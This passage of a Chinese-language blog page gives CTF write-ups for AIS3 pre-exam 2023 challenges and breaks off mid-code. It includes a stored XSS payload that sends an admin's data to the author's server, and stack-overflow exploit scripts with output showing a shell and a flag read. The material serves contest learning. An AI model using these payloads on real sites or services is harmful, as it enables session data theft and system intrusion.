id=\"其他戰隊成員的-writeup\"\u003e其他戰隊成員的 writeup\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://hackmd.io/@Vincent550102/rkxqeOJ--a\"\u003eHackmd\u003c/a\u003e\u003c/p\u003e\n","description":"","image":"/images/CTF.png","permalink":"https://blog.chummydns.com/blogs/balsn-2023-writeup/","title":"BALSN 2023 WriteUp"},{"content":"\u003ch2 id=\"welcome\"\u003eWelcome\u003c/h2\u003e\n\u003ch3 id=\"題目\"\u003e題目\u003c/h3\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/239931158-52040d8d-3a45-495a-a298-20160a8da1bf.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch3 id=\"解題\"\u003e解題\u003c/h3\u003e\n\u003cp\u003e讀一下 \u003ca href=\"https://github.com/Jimmy01240397/CTF-writeup/blob/master/ais3-pre-exam-2023-writeup/Welcome/welcome.pdf\"\u003epdf\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"e-portfolio-baby\"\u003eE-Portfolio baby\u003c/h2\u003e\n\u003ch3 id=\"題目-1\"\u003e題目\u003c/h3\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/239947968-58cebf9a-2d90-4e46-962c-708821270e0e.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch3 id=\"解題-1\"\u003e解題\u003c/h3\u003e\n\u003cp\u003e網頁進來是登入介面\n\u003cimg src=\"https://user-images.githubusercontent.com/57281249/239949795-ccaa3dcf-f7dd-486e-9ceb-ef88c53b4639.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003eAbout 那邊可以放 html 看起來可以 XSS\n\u003cimg src=\"https://user-images.githubusercontent.com/57281249/239949939-80bef056-5b2f-411e-9dee-ac420c3487e7.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e測一下\n\u003cimg src=\"https://user-images.githubusercontent.com/57281249/239950346-3fe6900c-5d62-4690-9550-4aaaa7115e5c.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e看起來可以\n\u003cimg src=\"https://user-images.githubusercontent.com/57281249/239950395-1559651a-26a4-4397-8bf6-c4c143e47259.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e用 flask 隨便寫個 server 聽 request\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#!/usr/bin/env python3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003efrom\u003c/span\u003e flask \u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e Flask,request,redirect,Response\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eapp \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e Flask(__name__)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e@app.route\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;/\u0026#39;\u003c/span\u003e,methods\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;GET\u0026#39;\u003c/span\u003e])\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003edata\u003c/span\u003e():\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    print(request\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eargs)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;aaa\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e __name__ \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;__main__\u0026#34;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    app\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003erun(host\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;0.0.0.0\u0026#34;\u003c/span\u003e,port\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e80\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003epayload\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-html\" data-lang=\"html\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u0026lt;\u003cspan style=\"color:#f92672\"\u003eh5\u003c/span\u003e\u0026gt;Hello!\u0026lt;/\u003cspan style=\"color:#f92672\"\u003eh5\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eI am a \u0026lt;\u003cspan style=\"color:#f92672\"\u003espan\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003estyle\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;color: red;\u0026#34;\u003c/span\u003e\u0026gt;new\u0026lt;/\u003cspan style=\"color:#f92672\"\u003espan\u003c/span\u003e\u0026gt; user.\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u0026lt;\u003cspan style=\"color:#f92672\"\u003eimg\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003esrc\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003ex\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eonerror\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;fetch(\u0026#34;/api/portfolio\u0026#34;).then(res =\u0026gt; res.json()).then(data =\u0026gt; {fetch(`http://10.113.193.20?${new URLSearchParams(data.data)}`)})\u0026#39;\u003c/span\u003e/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e送去給 admin\n\u003cimg src=\"https://user-images.githubusercontent.com/57281249/239951160-ce6aab2d-05dc-4a7a-a1bf-d611321778b6.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e然後就收到 flag 了\n\u003cimg src=\"https://user-images.githubusercontent.com/57281249/239951318-cdb64a68-3280-4d77-89e7-068574d94b4f.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch3 id=\"flag\"\u003eFlag\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003eAIS3{\u0026lt;img src=x onerror='fetch(...}\u003c/code\u003e\u003c/p\u003e\n\u003ch2 id=\"managementsystem\"\u003eManagementSystem\u003c/h2\u003e\n\u003ch3 id=\"題目-2\"\u003e題目\u003c/h3\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/239945264-fe5fdba3-c448-4cb5-a992-c3e0e517a49e.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch3 id=\"解題-2\"\u003e解題\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eIDA 打開\u003c/li\u003e\n\u003cli\u003e人真好有給 shell code\n\u003cimg src=\"https://user-images.githubusercontent.com/57281249/239945579-c0bb2a2a-acb4-44a1-877d-45215b54d609.png\" alt=\"image\"\u003e\u003c/li\u003e\n\u003cli\u003e每個 user 的 function 找一遍後發現 \u003ccode\u003edelete_user\u003c/code\u003e 有用 gets，可以 stack overflow，先讓他跑到 \u003ccode\u003e\u0026quot;Invalid index.\u0026quot;\u003c/code\u003e 感覺問題比較少。\n\u003cimg src=\"https://user-images.githubusercontent.com/57281249/239946309-5ab98d0b-aa5e-4a18-ae77-4e6f49c20f30.png\" alt=\"image\"\u003e\u003c/li\u003e\n\u003cli\u003e找 shell code 的位置\n\u003cimg src=\"https://user-images.githubusercontent.com/57281249/239947071-567d01ea-a12f-422b-86ce-5e64132ec7b9.png\" alt=\"image\"\u003e\u003c/li\u003e\n\u003cli\u003eexploit\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e pwn\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e re\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e sys\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003er \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e pwn\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eremote(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;chals1.ais3.org\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e10003\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eprint(r\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003erecvrepeat(timeout\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e)\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003edecode())\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003er\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esendline(\u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;3\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eprint(r\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003erecvrepeat(timeout\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e)\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003edecode())\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003er\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esendline(\u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;-1\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;x\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e8\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e13\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e int(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;40131B\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e16\u003c/span\u003e)\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eto_bytes(\u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;little\u0026#39;\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003ewhile\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eTrue\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    print(r\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003erecvrepeat(timeout\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e)\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003edecode(), end\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026gt; \u0026#39;\u003c/span\u003e, end\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    r\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esend(input()\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eencode())\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#    r.send(sys.stdin.buffer.read())\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cpre tabindex=\"0\"\u003e\u003ccode\u003echummy@hitcon:~/ais3preexam2023$ python3 mansysexp.py                                                                                                                                                    [11/294][+] Opening connection to chals1.ais3.org on port 10003: Done\nChoose an option:\n1. Add user\n2. Show users\n3. Delete user\n4. Exit\n\u0026gt;\nEnter the index of the user you want to delete:\nInvalid index.\nCongratulations! You\u0026#39;ve successfully executed the secret function.\n\u0026gt; ls\nbin\nboot\ndev\netc\nhome\nlib\nlib32\nlib64\nlibx32\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\n\u0026gt; ls /home/chal\nMakefile\nflag.txt\nms\nms.c\nrun.sh\n\u0026gt; cat /home/chal/flag.txt\nFLAG{C0n6r47ul4710n5_0n_cr4ck1n6_7h15_pr09r4m_!!_!!_!}\n\u0026gt; exit\n\u0026gt;\n\u0026gt;\n[*] Closed connection to chals1.ais3.org port 10003\nTraceback (most recent call last):\n  File \u0026#34;/home/chummy/.local/lib/python3.9/site-packages/pwnlib/tubes/sock.py\u0026#34;, line 65, in send_raw\n    self.sock.sendall(data)\nBrokenPipeError: [Errno 32] Broken pipe\n\nDuring handling of the above exception, another exception occurred:\n\nTraceback (most recent call last):\n  File \u0026#34;/home/chummy/ais3preexam2023/mansysexp.py\u0026#34;, line 15, in \u0026lt;module\u0026gt;\n    r.send(input().encode())\n  File \u0026#34;/home/chummy/.local/lib/python3.9/site-packages/pwnlib/tubes/tube.py\u0026#34;, line 778, in send\n    self.send_raw(data)\n  File \u0026#34;/home/chummy/.local/lib/python3.9/site-packages/pwnlib/tubes/sock.py\u0026#34;, line 70, in send_raw\n    raise EOFError\nEOFError\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"flag-1\"\u003eFlag\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003eFLAG{C0n6r47ul4710n5_0n_cr4ck1n6_7h15_pr09r4m_!!_!!_!}\u003c/code\u003e\u003c/p\u003e\n\u003ch2 id=\"robot\"\u003eRobot\u003c/h2\u003e\n\u003ch3 id=\"題目-3\"\u003e題目\u003c/h3\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/239931354-afd14468-755c-4429-93a4-720e96efa0ac.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch3 id=\"解題-3\"\u003e解題\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e pwn\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e re\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003er \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e pwn\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eremote(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;chals1.ais3.org\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e12348\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003er\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003erecvline()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003er\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003erecvline()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003ewhile\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eTrue\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    now \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e r\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003erecv(timeout\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    print(now\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003edecode()\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003estrip())\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    groups \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e re\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003ematch\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\\s*(\\d*)\\s*([^\\s\\d]*)\\s*(\\d*)\u0026#39;\u003c/span\u003e, now)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    ans \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e groups\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003egroup(\u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;+-*/\u0026#39;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        ans \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e str(eval(\u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003egroups\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003egroup(\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e)\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003edecode()\u003cspan style=\"color:#e6db74\"\u003e}{\u003c/span\u003egroups\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003egroup(\u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e)\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003edecode()\u003cspan style=\"color:#e6db74\"\u003e}{\u003c/span\u003egroups\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003egroup(\u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e)\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003edecode()\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e))\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eencode()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        print(\u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ans: \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003eans\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003edecode()\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        r\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esendline(ans)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;bad\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cpre tabindex=\"0\"\u003e\u003ccode\u003echummy@hitcon:~/ais3preexam2023$ python3 robotexp.py                                                                                                                                                      [30/53][+] Opening connection to chals1.ais3.org on port 12348: Done\n9  +  8\nans: 17\n8+9\nans: 17\n8        +        5\nans: 13\n1  *  5\nans: 5\n9 + 7\nans: 16\n2 + 4\nans: 6\n3  *  9\nans: 27\n10+6\nans: 16\n6  +  10\nans: 16\n3 * 3\nans: 9\n6*9\nans: 54\n3 * 8\nans: 24\n8*7\nans: 56\n8 * 1\nans: 8\n6    +    3\nans: 9\n9     +     7\nans: 16\n1*1\nans: 1\n3     *     4\nans: 12\n6 + 4\nans: 10\n7     *     9\nans: 63\n3     +     9\nans: 12\n8  +  2\nans: 10\n1+1\nans: 2\n9     *     3\nans: 27\n3  *  2\nans: 6\n6*2\nans: 12\n6+5\nans: 11\n1+2\nans: 3\n7  *  2\nans: 14\nprint(\u0026#39;Segmentation fault (core dumped)\u0026#39;), exit(139)\nbad\n6  *  4\nans: 24\nCongratulations! Flag: AIS3{don\u0026#39;t_eval_unknown_code_or_pipe_curl_to_sh}\nbad\nTraceback (most recent call last):\n  File \u0026#34;/home/chummy/ais3preexam2023/robotexp.py\u0026#34;, line 10, in \u0026lt;module\u0026gt;\n    now = r.recv(timeout=1)\n  File \u0026#34;/home/chummy/.local/lib/python3.9/site-packages/pwnlib/tubes/tube.py\u0026#34;, line 104, in recv\n    return self._recv(numb, timeout) or b\u0026#39;\u0026#39;\n  File \u0026#34;/home/chummy/.local/lib/python3.9/site-packages/pwnlib/tubes/tube.py\u0026#34;, line 174, in _recv\n    if not self.buffer and not self._fillbuffer(timeout):\n  File \u0026#34;/home/chummy/.local/lib/python3.9/site-packages/pwnlib/tubes/tube.py\u0026#34;, line 153, in _fillbuffer\n    data = self.recv_raw(self.buffer.get_fill_size())\n  File \u0026#34;/home/chummy/.local/lib/python3.9/site-packages/pwnlib/tubes/sock.py\u0026#34;, line 56, in recv_raw\n    raise EOFError\nEOFError\n[*] Closed connection to chals1.ais3.org port 12348\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"flag-2\"\u003eFlag\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003eAIS3{don't_eval_unknown_code_or_pipe_curl_to_sh}\u003c/code\u003e\u003c/p\u003e\n\u003ch2 id=\"simplypwn\"\u003eSimplyPwn\u003c/h2\u003e\n\u003ch3 id=\"題目-4\"\u003e題目\u003c/h3\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/239932495-6a0bafff-9626-4400-80ff-eebe9e2ac101.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch3 id=\"解題-4\"\u003e解題\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eIDA 打開\u003c/li\u003e\n\u003cli\u003e人真好有給 shell code\n\u003cimg src=\"https://user-images.githubusercontent.com/57281249/239933559-f2a98b42-9d2a-4daa-8d46-ea66fac90097.png\" alt=\"image\"\u003e\u003c/li\u003e\n\u003cli\u003earray 最長 64 bytes 然後 read 256 bytes 一臉就會 stack overflow.\n\u003cimg src=\"https://user-images.githubusercontent.com/57281249/239943925-86da7a51-43c9-4d25-abb2-970d7d4fceba.png\" alt=\"image\"\u003e\u003c/li\u003e\n\u003cli\u003e找 shell code 的位置\n\u003cimg src=\"https://user-images.githubusercontent.com/57281249/239944562-8c292e6c-fa5d-46c9-95dd-a81dbea6c5e5.png\" alt=\"image\"\u003e\u003c/li\u003e\n\u003cli\u003eexploit\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e pwn\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e re\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e sys\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003er \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e pwn\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eremote(\u003cspan 